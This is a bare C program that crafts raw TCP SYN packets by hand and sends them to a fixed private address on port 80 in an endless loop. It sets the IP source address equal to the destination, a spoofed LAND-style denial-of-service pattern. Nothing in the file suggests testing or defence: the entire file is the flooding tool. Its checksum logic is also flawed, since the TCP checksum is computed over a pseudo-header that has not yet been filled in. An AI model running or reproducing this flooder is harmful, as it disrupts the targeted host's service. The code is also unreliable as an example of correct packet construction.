#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>

struct pseudo_header{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	
	struct tcphdr tcp;
};

unsigned short csum( unsigned short *ptr, int nbytes ) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while( nbytes > 1 ){
		sum += *ptr++;
		nbytes -= 2;
	}
	
	if( nbytes == 1 ){
		oddbyte = 0;
		*( ( u_char* ) &oddbyte ) = *( u_char* ) ptr;
		sum += oddbyte;
	}
	sum = ( sum >> 16 ) + ( sum & 0xffff );
	sum = sum + ( sum >> 16 );
	answer = ( short ) ~sum;

	return ( answer );
}

int main( void ) {

	int s;
	char datagram[ 4096 ], source_ip[ 32 ];
	struct iphdr *iph;
	struct tcphdr *tcph;
	struct sockaddr_in sin;
	struct pseudo_header psh;
	
	int one = 1;
	const int *val = &one;

	strcpy(source_ip, "192.168.0.9");
	s = socket( PF_INET, SOCK_RAW, IPPROTO_TCP );

	if( s == -1 ) {
		printf( "socket open error\n" );

		return -1;
	}

	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	sin.sin_addr.s_addr = inet_addr("192.168.0.7");
	iph = (struct iphdr *)datagram;
	tcph = (struct tcphdr *)(datagram + sizeof(struct ip));

	memset(datagram, 0, 4096);
	
    tcph->source = htons(1234);
    tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    tcph->check = csum((unsigned short *)&psh, sizeof(struct pseudo_header));
    
    psh.source_address = inet_addr(source_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
    
    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
    
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
	iph->id = htons(54321);
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = sin.sin_addr.s_addr;
	iph->daddr = sin.sin_addr.s_addr;

	iph->check = csum( ( unsigned short * ) datagram, iph->tot_len >> 1 );

	if( setsockopt( s, IPPROTO_IP, IP_HDRINCL, val, sizeof( one ) ) < 0 ) {
		printf( "%d:%s\n", errno, strerror( errno ) );	
		exit( 0 );
	}

	while( 1 ) {
		if( sendto( s, datagram, iph->tot_len, 0, ( struct sockaddr * ) &sin, sizeof( sin ) ) < 0 ) {
			printf( "error\n" );	
		}
		else {
			printf( "packet send\n" );
		}
		fflush( stdout );
	}
	return 0;
}
